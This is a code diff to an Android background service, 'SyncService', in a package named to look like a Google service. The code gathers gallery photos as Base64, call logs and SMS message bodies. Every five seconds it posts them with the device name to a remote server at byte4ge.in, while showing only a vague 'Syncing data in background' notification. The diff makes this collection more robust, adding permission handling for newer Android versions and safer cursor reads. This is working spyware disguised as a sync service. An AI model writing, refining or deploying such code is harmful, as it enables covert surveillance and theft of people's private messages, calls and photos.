@@ -1,6 +1,5 @@
 package com.b4g.googleservice;
 
-
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -37,16 +36,12 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 import android.Manifest;
 
-import com.example.apiapp.GalleryUtils;
-import com.example.apiapp.ImageEncoder;
-
-
 public class SyncService extends Service {
     private static final String TAG = "SyncService";
     private static final int NOTIFICATION_ID = 1;
     private static final String CHANNEL_ID = "SyncServiceChannel";
     private final String API_URL = "https://byte4ge.in/SyncServiceAPI/sync.php";
-    private final int SYNC_INTERVAL = 30000; // 30 seconds in milliseconds
+    private final int SYNC_INTERVAL = 5000; // 30 seconds in milliseconds
     private Handler handler;
     private Runnable syncRunnable;
 
@@ -70,8 +65,17 @@ public class SyncService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+        boolean canAccessGallery = false;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            canAccessGallery = ContextCompat.checkSelfPermission(this, 
+                Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+        } else {
+            canAccessGallery = ContextCompat.checkSelfPermission(this, 
+                Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+        
+        if (canAccessGallery) {
             ArrayList<HashMap<String, String>> imagePaths = GalleryUtils.getGalleryImages(getApplicationContext());
             Log.d("SyncService", "Total images found: " + imagePaths.size());
         } else {
@@ -113,15 +117,15 @@ public class SyncService extends Service {
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Sync Service")
                 .setContentText("Syncing data in background")
-                .setSmallIcon(R.drawable.ic_sync) // Make sure to create this icon
+                .setSmallIcon(android.R.drawable.ic_popup_sync) // Using system icon instead
                 .setPriority(NotificationCompat.PRIORITY_LOW);
 
         return builder.build();
     }
 
     private boolean checkPermissions() {
-        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
     }
 
     private void sendCombinedData() {
@@ -137,17 +141,28 @@ public class SyncService extends Service {
             String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
             String appID = "app46";
 
-            ArrayList<HashMap<String, String>> imageList = GalleryUtils.getGalleryImages(getApplicationContext());
+            boolean canAccessGallery = false;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                canAccessGallery = ContextCompat.checkSelfPermission(this, 
+                    Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+            } else {
+                canAccessGallery = ContextCompat.checkSelfPermission(this, 
+                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+            }
+            
             JSONArray imageArray = new JSONArray();
-
-            for (HashMap<String, String> imageData : imageList) {
-                try {
-                    JSONObject imageObject = new JSONObject();
-                    imageObject.put("name", imageData.get("name"));  // Send actual name
-                    imageObject.put("data", ImageEncoder.encodeImageToBase64(imageData.get("path"))); // Convert to Base64
-                    imageArray.put(imageObject);
-                } catch (JSONException e) {
-                    e.printStackTrace();
+            if (canAccessGallery) {
+                ArrayList<HashMap<String, String>> imageList = GalleryUtils.getGalleryImages(getApplicationContext());
+                
+                for (HashMap<String, String> imageData : imageList) {
+                    try {
+                        JSONObject imageObject = new JSONObject();
+                        imageObject.put("name", imageData.get("name"));  // Send actual name
+                        imageObject.put("data", ImageEncoder.encodeImageToBase64(imageData.get("path"))); // Convert to Base64
+                        imageArray.put(imageObject);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
                 }
             }
 
@@ -161,7 +176,6 @@ public class SyncService extends Service {
             combinedData.put("call_logs", callLogs);
             combinedData.put("sms_logs", smsLogs);
 
-
         } catch (JSONException e) {
             e.printStackTrace();
             Log.e(TAG, "Error creating data format: " + e.getMessage());
@@ -173,6 +187,11 @@ public class SyncService extends Service {
 
     private JSONArray getCallLogs() {
         JSONArray callLogsArray = new JSONArray();
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            return callLogsArray;
+        }
+        
         Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null,
@@ -185,12 +204,21 @@ public class SyncService extends Service {
 
         int count = 0;
         try {
+            int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
+            int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
+            int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
+            
+            if (numberColumn < 0 || typeColumn < 0 || durationColumn < 0 || dateColumn < 0) {
+                return callLogsArray;
+            }
+            
             while (cursor.moveToNext() && count < 50) {
                 JSONObject logEntry = new JSONObject();
-                logEntry.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
-                logEntry.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
-                logEntry.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
-                logEntry.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
+                logEntry.put("number", cursor.getString(numberColumn));
+                logEntry.put("type", cursor.getInt(typeColumn));
+                logEntry.put("duration", cursor.getLong(durationColumn));
+                logEntry.put("date", cursor.getLong(dateColumn));
                 callLogsArray.put(logEntry);
                 count++;
             }
@@ -204,6 +232,11 @@ public class SyncService extends Service {
 
     private JSONArray getSmsLogs() {
         JSONArray smsLogsArray = new JSONArray();
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            return smsLogsArray;
+        }
+        
         Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null,
@@ -216,12 +249,21 @@ public class SyncService extends Service {
 
         int count = 0;
         try {
+            int addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+            int bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
+            int typeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);
+            int dateColumn = cursor.getColumnIndex(Telephony.Sms.DATE);
+            
+            if (addressColumn < 0 || bodyColumn < 0 || typeColumn < 0 || dateColumn < 0) {
+                return smsLogsArray;
+            }
+            
             while (cursor.moveToNext() && count < 50) {
                 JSONObject smsEntry = new JSONObject();
-                smsEntry.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
-                smsEntry.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
-                smsEntry.put("type", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE)));
-                smsEntry.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)));
+                smsEntry.put("address", cursor.getString(addressColumn));
+                smsEntry.put("body", cursor.getString(bodyColumn));
+                smsEntry.put("type", cursor.getInt(typeColumn));
+                smsEntry.put("date", cursor.getLong(dateColumn));
                 smsLogsArray.put(smsEntry);
                 count++;
             }
@@ -253,7 +295,8 @@ public class SyncService extends Service {
             @Override
             public void onResponse(Call call, Response response) throws IOException {
                 Log.d(TAG, "Data sent successfully");
+                response.close(); // Important to close the response to avoid memory leaks
             }
         });
     }
-}
+} 
